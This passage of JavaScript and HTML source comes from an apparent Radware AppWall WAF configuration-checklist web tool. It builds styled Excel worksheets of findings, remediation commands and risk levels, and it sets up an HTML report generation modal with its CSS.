                        fgColor: { argb: 'F0F5FF' } // Light blue
                    };
                    codeRow.height = 100;
                    
                    currentRow++;
                });
            }
            
            worksheet.addRow([]);
            currentRow++;
        });
    }
    
    // Add notes section if requested
    if (includeNotes) {
        const notesHeaderRow = worksheet.addRow(['Category Configuration Notes']);
        notesHeaderRow.font = { bold: true, size: 14 };
        notesHeaderRow.getCell(1).fill = {
            type: 'gradient',
            gradient: 'angle',
            degree: 90,
            stops: [
                {position: 0, color: {argb: 'FFE8F7E3'}},
                {position: 1, color: {argb: 'FFC5E5BB'}}
            ]
        };
        worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
        notesHeaderRow.height = 24;
        
        currentRow++;
        
        if (currentProject && currentProject.notes && currentProject.notes[category.id]) {
            const notesRow = worksheet.addRow([currentProject.notes[category.id]]);
            worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
            notesRow.getCell(1).alignment = { wrapText: true };
            notesRow.height = 100;
            
            // Style the notes cell
            notesRow.getCell(1).fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: 'F7FFF5' } // Very light green
            };
            notesRow.getCell(1).border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
        } else {
            const notesRow = worksheet.addRow(['No notes have been added for this category']);
            worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
            notesRow.getCell(1).font = { italic: true, color: { argb: '999999' } };
            notesRow.getCell(1).alignment = { horizontal: 'center' };
        }
    }
    
    // Add a footer with creation date
    worksheet.addRow([]);
    const footerRow = worksheet.addRow([`Generated: ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}`]);
    worksheet.mergeCells(`A${footerRow.number}:E${footerRow.number}`);
    footerRow.getCell(1).font = { italic: true, color: { argb: '888888' } };
    footerRow.getCell(1).alignment = { horizontal: 'right' };
    
    // Set column widths
    worksheet.getColumn(1).width = 15;  // ID
    worksheet.getColumn(2).width = 60;  // Task
    worksheet.getColumn(3).width = 15;  // Priority
    worksheet.getColumn(4).width = 18;  // Status (wider to accommodate icons)
    worksheet.getColumn(5).width = 25;  // Notes
}

// Create enhanced findings worksheet
function createEnhancedFindingsWorksheet(worksheet) {
    // Add title with gradient styling
    const titleRow = worksheet.addRow(['WAF Configuration Issues']);
    titleRow.font = { bold: true, size: 18 };
    worksheet.mergeCells('A1:G1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    titleRow.height = 36;
    
    // Style the title with red gradient fill
    titleRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FFC00000'}},
            {position: 1, color: {argb: 'FFFF7373'}}
        ]
    };
    titleRow.getCell(1).font = { bold: true, size: 18, color: { argb: 'FFFFFF' } };
    
    // Add subtitle
    const subtitleRow = worksheet.addRow(['Identified configuration issues and recommended remediation steps']);
    subtitleRow.font = { italic: true };
    worksheet.mergeCells('A2:G2');
    subtitleRow.alignment = { horizontal: 'center' };
    subtitleRow.height = 24;
    
    worksheet.addRow([]);
    
    // Check if there are any findings
    if (!appwallData.findings || appwallData.findings.length === 0) {
        const noFindingsRow = worksheet.addRow(['â No configuration issues have been documented']);
        worksheet.mergeCells(`A4:G4`);
        noFindingsRow.alignment = { horizontal: 'center' };
        noFindingsRow.font = { bold: true, size: 14, color: { argb: '00A35C' } };
        noFindingsRow.height = 30;
        
        // Add explanation
        const explanationRow = worksheet.addRow(['All configuration checks have passed or no issues have been identified yet. Continue to monitor for potential security concerns as your configuration evolves.']);
        worksheet.mergeCells(`A5:G5`);
        explanationRow.alignment = { horizontal: 'center' };
        explanationRow.font = { italic: true };
        
        return;
    }
    
    // Add findings summary
    const summaryRow = worksheet.addRow([`Total Issues: ${appwallData.findings.length}`]);
    worksheet.mergeCells('A4:G4');
    summaryRow.font = { bold: true };
    summaryRow.alignment = { horizontal: 'left' };
    
    worksheet.addRow([]);
    
    // Add column headers with enhanced styling
    const headerRow = worksheet.addRow(['ID', 'Category', 'Issue Title', 'Severity', 'Description', 'Remediation', 'Status']);
    
    // Style header row with gradient
    headerRow.eachCell(cell => {
        cell.font = { bold: true, color: { argb: 'FFFFFF' } };
        cell.fill = {
            type: 'gradient',
            gradient: 'angle',
            degree: 90,
            stops: [
                {position: 0, color: {argb: 'FFC00000'}},
                {position: 1, color: {argb: 'FFFF4646'}}
            ]
        };
        cell.border = {
            top: { style: 'thin' },
            left: { style: 'thin' },
            bottom: { style: 'thin' },
            right: { style: 'thin' }
        };
        cell.alignment = { horizontal: 'center', vertical: 'middle' };
    });
    headerRow.height = 26;
    
    // Add findings with enhanced styling
    appwallData.findings.forEach((finding, index) => {
        const findingRow = worksheet.addRow([
            finding.id,
            getCategoryTitle(finding.category),
            finding.title,
            capitalizeFirstLetter(finding.severity),
            finding.description,
            finding.remediation,
            'Open' // Default status (could be tracked in a real app)
        ]);
        
        // Style the row
        findingRow.eachCell((cell, colNumber) => {
            // Add borders
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            
            // Add subtle alternating row colors
            if (index % 2 === 0) {
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'FFF5F5' } // Very light red
                };
            }
            
            // Text wrapping for longer text
            if (colNumber === 5 || colNumber === 6) {
                cell.alignment = { wrapText: true, vertical: 'top' };
            }
            
            // Style severity cell
            if (colNumber === 4) {
                cell.alignment = { horizontal: 'center', vertical: 'middle' };
                
                if (finding.severity === 'high') {
                    cell.value = "â ï¸ High";
                    cell.font = { bold: true, color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'C00000' } // Dark red
                    };
                } else if (finding.severity === 'medium') {
                    cell.value = "â  Medium";
                    cell.font = { color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'ED7D31' } // Orange
                    };
                } else if (finding.severity === 'low') {
                    cell.value = "â¢ Low";
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFCC00' } // Yellow
                    };
                } else {
                    cell.value = "â¹ Info";
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: '4472C4' } // Blue
                    };
                    cell.font = { color: { argb: 'FFFFFF' } };
                }
            }
            
            // Style status cell
            if (colNumber === 7) {
                cell.alignment = { horizontal: 'center', vertical: 'middle' };
                cell.value = "Open";
                cell.font = { color: { argb: 'C00000' } };
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'FFDFDF' } // Light red
                };
            }
        });
        
        // Adjust row height based on content
        const textLength = (finding.description?.length || 0) + (finding.remediation?.length || 0);
        if (textLength > 500) {
            findingRow.height = 120;
        } else if (textLength > 200) {
            findingRow.height = 80;
        } else {
            findingRow.height = 60;
        }
    });
    
    // Add configuration commands section
    worksheet.addRow([]);
    
    const commandsTitle = worksheet.addRow(['Remediation Commands']);
    commandsTitle.font = { bold: true, size: 16 };
    commandsTitle.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FFE8E8FF'}},
            {position: 1, color: {argb: 'FFC9C9FF'}}
        ]
    };



worksheet.mergeCells(`A${commandsTitle.number}:G${commandsTitle.number}`);
    commandsTitle.height = 30;
    
    worksheet.addRow([]);
    
    // Add commands for each finding
    appwallData.findings.forEach((finding, index) => {
        if (finding.config) {
            const findingHeader = worksheet.addRow([`Commands for: ${finding.title} (${finding.id})`]);
            findingHeader.font = { bold: true };
            worksheet.mergeCells(`A${findingHeader.number}:G${findingHeader.number}`);
            findingHeader.getCell(1).fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: 'EFEFFF' } // Light blue-gray
            };
            findingHeader.height = 24;
            
            const commandsRow = worksheet.addRow([finding.config]);
            worksheet.mergeCells(`A${commandsRow.number}:G${commandsRow.number}`);
            commandsRow.getCell(1).alignment = { wrapText: true };
            commandsRow.getCell(1).font = { name: 'Consolas', size: 10 };
            commandsRow.getCell(1).fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: 'F5F5FF' } // Very light blue
            };
            commandsRow.getCell(1).border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            commandsRow.height = 120;
            
            worksheet.addRow([]);
        }
    });
    
    // Add impact section
    const impactHeaderRow = worksheet.addRow(['Risk Assessment']);
    impactHeaderRow.font = { bold: true, size: 14 };
    impactHeaderRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FFFDF5E6'}},
            {position: 1, color: {argb: 'FFFFDAB9'}}
        ]
    };
    worksheet.mergeCells(`A${impactHeaderRow.number}:G${impactHeaderRow.number}`);
    impactHeaderRow.height = 26;
    
    worksheet.addRow([]);
    
    // Add risk assessment table
    const riskHeaders = worksheet.addRow(['Severity', 'Count', 'Description', 'Typical Impact', 'Recommended Response Time']);
    riskHeaders.eachCell(cell => {
        cell.font = { bold: true, color: { argb: 'FFFFFF' } };
        cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: '4472C4' }
        };
        cell.border = {
            top: { style: 'thin' },
            left: { style: 'thin' },
            bottom: { style: 'thin' },
            right: { style: 'thin' }
        };
        cell.alignment = { horizontal: 'center', vertical: 'middle' };
    });
    
    // Count findings by severity
    const highCount = appwallData.findings.filter(f => f.severity === 'high').length;
    const mediumCount = appwallData.findings.filter(f => f.severity === 'medium').length;
    const lowCount = appwallData.findings.filter(f => f.severity === 'low').length;
    const infoCount = appwallData.findings.filter(f => f.severity === 'info').length;
    
    // Add risk assessment rows
    const highRow = worksheet.addRow([
        'High',
        highCount,
        'Critical security vulnerabilities that require immediate attention',
        'Could lead to unauthorized access, data breach, or system compromise',
        'Immediate (24-48 hours)'
    ]);
    
    const mediumRow = worksheet.addRow([
        'Medium',
        mediumCount,
        'Important security issues that should be addressed soon',
        'May enable attacks under specific conditions or have limited impact',
        'Short-term (1-2 weeks)'
    ]);
    
    const lowRow = worksheet.addRow([
        'Low',
        lowCount,
        'Minor security concerns or best practice violations',
        'Limited security impact but may indicate configuration weakness',
        'Medium-term (1-3 months)'
    ]);
    
    const infoRow = worksheet.addRow([
        'Informational',
        infoCount,
        'Configuration notes and optimization suggestions',
        'No direct security impact but may improve system robustness',
        'During regular maintenance'
    ]);
    
    // Style risk assessment rows
    [highRow, mediumRow, lowRow, infoRow].forEach((row, index) => {
        row.eachCell((cell, colNumber) => {
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            
            // Add alternating row colors
            if (index % 2 === 0) {
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'F5F5F5' } // Light gray
                };
            }
            
            // Center the count column
            if (colNumber === 2) {
                cell.alignment = { horizontal: 'center' };
            }
            
            // Style the severity column
            if (colNumber === 1) {
                cell.alignment = { horizontal: 'center' };
                
                if (index === 0) { // High
                    cell.font = { bold: true, color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'C00000' }
                    };
                } else if (index === 1) { // Medium
                    cell.font = { color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'ED7D31' }
                    };
                } else if (index === 2) { // Low
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFCC00' }
                    };
                } else { // Info
                    cell.font = { color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: '4472C4' }
                    };
                }
            }
        });
    });
    
    // Set column widths
    worksheet.getColumn(1).width = 15;  // ID
    worksheet.getColumn(2).width = 25;  // Category
    worksheet.getColumn(3).width = 40;  // Title
    worksheet.getColumn(4).width = 15;  // Severity
    worksheet.getColumn(5).width = 60;  // Description
    worksheet.getColumn(6).width = 60;  // Remediation
    worksheet.getColumn(7).width = 15;  // Status
}

// Safe method to add a worksheet with error handling
async function addWorksheet(workbook, name, callback) {
    try {
        const worksheet = workbook.addWorksheet(name);
        await callback(worksheet);
        return worksheet;
    } catch (error) {
        console.error(`Error creating worksheet "${name}":`, error);
        throw new Error(`Failed to create worksheet "${name}": ${error.message}`);
    }
}

// Create a safe worksheet name for Excel
function createSafeWorksheetName(title, index, usedNames) {
    // Excel worksheet name constraints:
    // 1. Max 31 characters
    // 2. Cannot contain: \ / ? * [ ] : 
    // 3. Cannot start or end with ' (single quote)
    // 4. Cannot be empty

    // First, remove invalid characters and sanitize
    let safeName = title
        .replace(/[\\\/?*[\]:]/g, '-') // Replace invalid chars with dash
        .replace(/^'|'$/g, '')         // Remove leading/trailing single quotes
        .trim();                        // Remove whitespace
    
    // Ensure name isn't empty after replacements
    if (!safeName || safeName.length === 0) {
        safeName = `Category-${index + 1}`;
    }
    
    // Add index to ensure uniqueness for similar category names
    const shortName = safeName.length > 26 ? safeName.substring(0, 26) : safeName;
    safeName = `${shortName}-${index + 1}`;
    
    // Ensure name doesn't exceed 31 chars
    if (safeName.length > 31) {
        safeName = safeName.substring(0, 31);
    }
    
    // Ensure name is unique
    let uniqueName = safeName;
    let counter = 1;
    
    while (usedNames.has(uniqueName.toLowerCase())) {
        counter++;
        // Create a new unique name with counter
        const suffix = `-${counter}`;
        uniqueName = safeName.substring(0, 31 - suffix.length) + suffix;
    }
    
    return uniqueName;
}

// Save the Excel file with enhanced filename
function saveExcelFile(buffer) {
    const blob = new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
    
    // Create a more descriptive filename
    let fileName = 'Radware_AppWall_Configuration';
    
    // Add project name if available
    if (currentProject && currentProject.name) {
        fileName += '_' + currentProject.name.replace(/[^a-z0-9]/gi, '_');
    }
    
    // Add completion percentage if available
    if (currentProject && currentProject.taskStatus) {
        let total = 0;
        let completed = 0;
        
        appwallData.categories.forEach(category => {
            category.checklist.forEach(group => {
                group.items.forEach(item => {
                    total++;
                    if (currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                        completed++;
                    }
                });
            });
        });
        
        const percentComplete = Math.round((completed / total) * 100);
        fileName += `_${percentComplete}pct`;
    }
    
    // Add date and time
    const date = new Date();
    const dateStr = formatDateForFileName(date);
    const timeStr = date.getHours().toString().padStart(2, '0') + 
                   date.getMinutes().toString().padStart(2, '0');
    
    fileName += `_${dateStr}_${timeStr}.xlsx`;
    
    // Create download link
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    
    // Clean up
    setTimeout(() => {
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    }, 100);
    
    console.log(`Excel report saved as: ${fileName}`);
}

// Format date for file name
function formatDateForFileName(date) {
    return [
        date.getFullYear(),
        String(date.getMonth() + 1).padStart(2, '0'),
        String(date.getDate()).padStart(2, '0')
    ].join('-');
}

// Extract code blocks from HTML content
function extractCodeBlocks(htmlContent) {
    if (!htmlContent) return [];
    
    const codeBlocks = [];
    const regex = /<div class="code-block">([\s\S]*?)<\/div>/g;
    let match;
    
    while ((match = regex.exec(htmlContent)) !== null) {
        // Extract the code block content
        let codeContent = match[1].trim();
        
        // Remove HTML tags and decode entities
        codeContent = codeContent
            .replace(/<[^>]*>/g, '') // Remove HTML tags
            .replace(/&lt;/g, '<')    // Decode common entities
            .replace(/&gt;/g, '>')
            .replace(/&amp;/g, '&')
            .replace(/&quot;/g, '"')
            .replace(/&#039;/g, "'")
            .replace(/\s+/g, ' ')     // Normalize whitespace
            .trim();
        
        codeBlocks.push(codeContent);
    }
    
    return codeBlocks;
}

// Show loading overlay
function showLoadingOverlay(message = 'Loading...') {
    // Create loading overlay if doesn't exist
    if (!document.getElementById('excel-loading-overlay')) {
        const overlay = document.createElement('div');
        overlay.id = 'excel-loading-overlay';
        overlay.className = 'fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center backdrop-blur-sm';
        
        overlay.innerHTML = `
            <div class="bg-white rounded-lg p-8 shadow-2xl max-w-md w-full">
                <div class="flex items-center justify-center mb-4">
                    <div class="relative w-24 h-24">
                        <div class="absolute inset-0 border-8 border-gray-200 rounded-full"></div>
                        <div class="absolute inset-0 border-8 border-t-green-500 border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
                        <div class="absolute inset-2 border-8 border-t-transparent border-r-green-300 border-b-transparent border-l-transparent rounded-full animate-spin animation-delay-200"></div>
                    </div>
                </div>
                <h3 id="loading-message" class="text-xl font-bold text-center text-gray-800 mb-2"></h3>
                <p class="text-sm text-center text-gray-600">This may take a few moments depending on the report size</p>
                <div class="mt-4 bg-gray-100 rounded-full h-2.5 overflow-hidden">
                    <div id="loading-progress" class="bg-gradient-to-r from-green-500 to-green-300 h-2.5 rounded-full w-0 transition-all duration-300"></div>
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
        
        // Add animation delay styles
        const style = document.createElement('style');
        style.textContent = `
            .animation-delay-200 {
                animation-delay: 0.2s;
            }
        `;
        document.head.appendChild(style);
    }
    
    // Update loading message
    document.getElementById('loading-message').textContent = message;
    document.getElementById('loading-progress').style.width = '0%';
    
    // Show the overlay
    document.getElementById('excel-loading-overlay').classList.remove('hidden');
}

// Hide loading overlay
function hideLoadingOverlay() {
    const overlay = document.getElementById('excel-loading-overlay');
    if (overlay) {
        // Animate progress to 100% before hiding
        const progress = document.getElementById('loading-progress');
        progress.style.width = '100%';
        
        setTimeout(() => {
            overlay.classList.add('hidden');
        }, 500);
    }
}

// Helper function to get a category title from ID
function getCategoryTitle(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.title : 'Unknown Category';
}
</script>


<!-- report html --!>
<script>
// --- HTML Report Generation Functionality ---

// Setup report generation button click handler
document.addEventListener('DOMContentLoaded', function() {
    const reportButton = document.getElementById('btn-generate-report');
    if (reportButton) {
        reportButton.addEventListener('click', function() {
            showReportModal();
        });
    }
});

// Show report generation options modal
function showReportModal() {
    // Create modal if it doesn't exist
    if (!document.getElementById('report-modal')) {
        createReportModal();
    }
    
    toggleModal('report-modal', true);
}

// Create the report generation modal
function createReportModal() {
    const modal = document.createElement('div');
    modal.id = 'report-modal';
    modal.className = 'fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm';
    
    modal.innerHTML = `
        <div class="bg-white rounded-xl shadow-2xl max-w-lg w-full">
            <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center bg-gradient-to-r from-radware-dark to-radware-primary text-white rounded-t-xl">
                <h3 class="text-xl font-semibold">Generate WAF Configuration Report</h3>
                <button class="modal-close text-white/80 hover:text-white">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="p-6">
                <div class="mb-5">
                    <p class="text-gray-700 mb-3">Generate a detailed HTML report of your WAF configuration status. This report can be saved locally or printed for documentation purposes.</p>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label for="report-format" class="block text-sm font-medium text-gray-700 mb-1">Report Format</label>
                        <select id="report-format" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="detailed">Detailed Report (Complete Configuration)</option>
                            <option value="executive">Executive Summary (Key Metrics)</option>
                            <option value="findings">Findings Only (Configuration Issues)</option>
                        </select>
                    </div>
                    
                    <div>
                        <label for="report-title" class="block text-sm font-medium text-gray-700 mb-1">Report Title</label>
                        <input type="text" id="report-title" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition" 
                            value="Radware AppWall WAF Configuration Report" placeholder="Enter report title">
                    </div>
                    
                    <div class="pt-2 space-y-2">
                        <label class="flex items-center">
                            <input type="checkbox" id="include-findings" class="rounded border-gray-300 text-radware-primary focus:ring-radware-accent" checked>
                            <span class="ml-2 text-sm text-gray-700">Include configuration issues</span>
                        </label>
                        
                        <label class="flex items-center">
                            <input type="checkbox" id="include-charts" class="rounded border-gray-300 text-radware-primary focus:ring-radware-accent" checked>
                            <span class="ml-2 text-sm text-gray-700">Include visual charts</span>
                        </label>
                        
                        <label class="flex items-center">
                            <input type="checkbox" id="include-techniques" class="rounded border-gray-300 text-radware-primary focus:ring-radware-accent" checked>
                            <span class="ml-2 text-sm text-gray-700">Include configuration techniques</span>
                        </label>
                    </div>
                </div>
            </div>
            <div class="border-t border-gray-200 px-6 py-4 flex justify-between items-center bg-gray-50 rounded-b-xl">
                <div id="report-generation-status" class="text-sm text-gray-500 hidden">
                    <div class="flex items-center">
                        <div class="animate-spin mr-2 h-4 w-4 border-2 border-radware-primary border-t-transparent rounded-full"></div>
                        <span>Generating report...</span>
                    </div>
                </div>
                <div class="flex items-center gap-3">
                    <button class="modal-close px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition">
                        Cancel
                    </button>
                    <button id="btn-generate-html-report" class="px-4 py-2 bg-radware-primary hover:bg-radware-secondary text-white rounded-lg transition flex items-center gap-2">
                        <i class="fas fa-file-code"></i> Generate HTML Report
                    </button>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Set up event listeners
    modal.querySelector('.modal-close').addEventListener('click', function() {
        toggleModal('report-modal', false);
    });
    
    document.getElementById('btn-generate-html-report').addEventListener('click', function() {
        generateHTMLReport();
    });
}

// Generate the HTML report based on selected options
function generateHTMLReport() {
    try {
        // Show generation status
        document.getElementById('report-generation-status').classList.remove('hidden');
        document.getElementById('btn-generate-html-report').disabled = true;
        
        // Get report options
        const reportFormat = document.getElementById('report-format').value;
        const reportTitle = document.getElementById('report-title').value || 'Radware AppWall WAF Configuration Report';
        const includeFindings = document.getElementById('include-findings').checked;
        const includeCharts = document.getElementById('include-charts').checked;
        const includeTechniques = document.getElementById('include-techniques').checked;
        
        // Generate report HTML
        const reportHTML = buildReportHTML(reportFormat, reportTitle, includeFindings, includeCharts, includeTechniques);
        
        // Download the report
        downloadHTMLReport(reportHTML, reportTitle);
        
        // Reset UI
        document.getElementById('report-generation-status').classList.add('hidden');
        document.getElementById('btn-generate-html-report').disabled = false;
        
        // Close modal
        toggleModal('report-modal', false);
        
        // Show success message
        showToast('HTML report generated successfully', 'success');
    } catch (error) {
        console.error('Error generating HTML report:', error);
        
        // Reset UI
        document.getElementById('report-generation-status').classList.add('hidden');
        document.getElementById('btn-generate-html-report').disabled = false;
        
        // Show error message
        showToast('Error generating report: ' + error.message, 'error');
    }
}

// Build the complete HTML report
function buildReportHTML(reportFormat, reportTitle, includeFindings, includeCharts, includeTechniques) {
    // Get metrics for the report
    const metrics = calculateReportMetrics();
    
    // Start building HTML
    let html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${escapeHtml(reportTitle)}</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            line-height: 1.5;
            color: #1f2937;
            background-color: #f9fafb;
            padding: 2rem;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 0.5rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            overflow: hidden;
        }
        
        .report-header {
            background: linear-gradient(to right, #003366, #0050B3);
            color: white;
            padding: 2rem;
            position: relative;
        }
        
        .report-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        
        .report-subtitle {
            font-size: 1.1rem;
            opacity: 0.9;
        }
        
        .report-date {
            position: absolute;
            top: 2rem;
            right: 2rem;
            font-size: 0.875rem;
            opacity: 0.8;
        }
        
        .report-body {
            padding: 2rem;
        }
        
        .section {
            margin-bottom: 2.5rem;
            border-bottom: 1px solid #e5e7eb;
            padding-bottom: 1.5rem;
        }
        
        .section:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
        
        .section-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: #0050B3;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
        }
        
        .section-title:before {
            content: '';
            display: inline-block;
            width: 0.25rem;
            height: 1.5rem;
            background-color: #0050B3;
            margin-right: 0.75rem;
            border-radius: 0.25rem;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .info-item {
            background-color: #f3f4f6;
            padding: 1rem;
            border-radius: 0.375rem;
        }
        
        .info-label {
            font-weight: 500;
            font-size: 0.875rem;
            color: #4b5563;
            margin-bottom: 0.25rem;
        }
        
        .info-value {
            font-weight: 600;
            font-size: 1rem;
        }
        
        .progress-container {
            margin-bottom: 1rem;
        }
        
        .progress-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
        }
        
        .progress-label {
            font-weight: 500;
        }
        
        .progress-value {
            font-weight: 600;
        }
        
        .progress-bar {
            height: 0.5rem;
            background-color: #e5e7eb;
            border-radius: 0.25rem;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(to right, #0050B3, #00A9FF);
            border-radius: 0.25rem;
        }
        
        .progress-fill.critical {
            background: linear-gradient(to right, #dc2626, #ef4444);
        }
        
        .progress-fill.high {
            background: linear-gradient(to right, #ea580c, #f97316);
        }
        
        .progress-fill.medium {
            background: linear-gradient(to right, #d97706, #fbbf24);
        }
        
        .table-container {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 1.5rem;
            font-size: 0.875rem;
        }
        
        th, td {
            text-align: left;
            padding: 0.75rem 1rem;
            border: 1px solid #e5e7eb;
        }
        
        th {
            background-color: #f3f4f6;
            font-weight: 600;
        }
        
        tr:nth-child(even) {
            background-color: #f9fafb;
        }
        
        .badge {
            display: inline-block;
            padding: 0.25rem 0.5rem;
            border-radius: 0.25rem;
            font-weight: 500;
            font-size: 0.75rem;
            text-transform: uppercase;
        }
        
        .badge-critical {
            background-color: #fee2e2;
            color: #b91c1c;
        }
        
        .badge-high {
            background-color: #ffedd5;
            color: #c2410c;
        }
        
        .badge-medium {
            background-color: #fef3c7;
            color: #b45309;
        }
        
        .badge-low {
            background-color: #d1fae5;
            color: #065f46;
        }
        
        .badge-completed {
            background-color: #d1fae5;
            color: #065f46;
        }
        
        .badge-notstarted {
            background-color: #fee2e2;
            color: #b91c1c;
        }
        
        .badge-na {
            background-color: #f3f4f6;
            color: #6b7280;
        }
        
        .category-card {
            background-color: #f9fafb;
            border: 1px solid #e5e7eb;
            border-radius: 0.5rem;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .category-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1rem;
        }
        
        .category-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: #0050B3;
        }
        
        .category-priority {
            font-size: 0.75rem;
            font-weight: 500;
        }
        
        .checklist-item {
            padding: 0.75rem;
            border-bottom: 1px solid #e5e7eb;
            display: flex;
            align-items: flex-start;
        }
        
        .checklist-item:last-child {
            border-bottom: none;
        }
        
        .checklist-status {
            margin-right: 1rem;
            flex-shrink: 0;
        }
        
        .checklist-text {
            font-size: 0.875rem;
        }
        
        .status-icon {
            width: 1.25rem;
            height: 1.25rem;
            border-radius: 9999px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 0.75rem;
        }
        
        .status-completed {
            background-color: #10B981;
            color: white;
        }
        
        .status-notstarted {
            background-color: #DC2626;
            color: white;
        }
        
        .status-na {
            background-color: #9CA3AF;
            color: white;
        }
        
        .finding-card {
            border: 1px solid #e5e7eb;
            border-radius: 0.5rem;
            margin-bottom: 1.5rem;
            overflow: hidden;
        }
        
        .finding-header {
            padding: 1rem;
            border-bottom: 1px solid #e5e7eb;
            background-color: #f9fafb;
        }
        
        .finding-title {
            font-weight: 600;
            font-size: 1rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .finding-body {
            padding: 1rem;
        }
        
        .finding-section {
            margin-bottom: 1rem;
        }
        
        .finding-label {
            font-weight: 500;
            font-size: 0.875rem;
            color: #4b5563;
            margin-bottom: 0.25rem;
        }
        
        .finding-value {
            font-size: 0.875rem;
        }
        
        .finding-commands {
            background-color: #1e293b;
            color: #e2e8f0;
            padding: 1rem;
            border-radius: 0.375rem;
            font-family: monospace;
            white-space: pre-wrap;
            font-size: 0.75rem;
            overflow-x: auto;
        }
        
        .charts-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }
        
        .chart-card {
            background-color: white;
            border: 1px solid #e5e7eb;
            border-radius: 0.5rem;
            overflow: hidden;
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);
        }
        
        .chart-header {
            padding: 1rem;
            background-color: #f3f4f6;
            border-bottom: 1px solid #e5e7eb;
            font-weight: 600;
        }
        
        .chart-body {
            padding: 1rem;
            display: flex;
            justify-content: center;
        }
        
        .chart-placeholder {
            width: 100%;
            height: 200px;
            background-color: #f9fafb;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #6b7280;
